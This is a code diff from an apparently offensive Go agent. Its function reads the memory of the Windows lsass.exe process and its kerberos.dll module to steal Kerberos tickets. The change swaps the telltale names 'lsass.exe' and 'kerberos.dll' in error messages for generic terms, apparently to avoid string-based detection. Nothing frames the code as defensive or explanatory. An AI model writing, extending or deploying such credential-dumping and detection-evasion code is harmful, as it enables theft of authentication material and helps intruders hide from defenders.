@@ -85,24 +85,24 @@ func executeKerbTickets() structs.CommandResult {
 func executeKerbTicketsInner() structs.CommandResult {
 	pid, err := lsassFindPID()
 	if err != nil {
-		return errorf("Kerberos tickets: locate lsass.exe: %v", err)
+		return errorf("Kerberos tickets: locate target process: %v", err)
 	}
 
 	h, err := lsassOpenForRead(pid)
 	if err != nil {
 		protection := detectLsassProtection()
-		return errorf("Kerberos tickets: open lsass.exe pid=%d: %v\n[!] Protection: %s\n[!] %s",
+		return errorf("Kerberos tickets: open target process pid=%d: %v\n[!] Protection: %s\n[!] %s",
 			pid, err, protection.Summary(), protection.AccessDeniedHint())
 	}
 	defer windows.CloseHandle(h)
 
 	kerbMod, err := lsassFindModuleInLsass(pid, "kerberos.dll")
 	if err != nil {
-		return errorf("Kerberos tickets: find kerberos.dll in lsass: %v", err)
+		return errorf("Kerberos tickets: find target module: %v", err)
 	}
 	kerbBytes, err := lsassReadModuleBytes(h, kerbMod)
 	if err != nil {
-		return errorf("Kerberos tickets: read kerberos.dll (base=0x%X size=%d): %v",
+		return errorf("Kerberos tickets: read target module (base=0x%X size=%d): %v",
 			kerbMod.Base, kerbMod.Size, err)
 	}
 
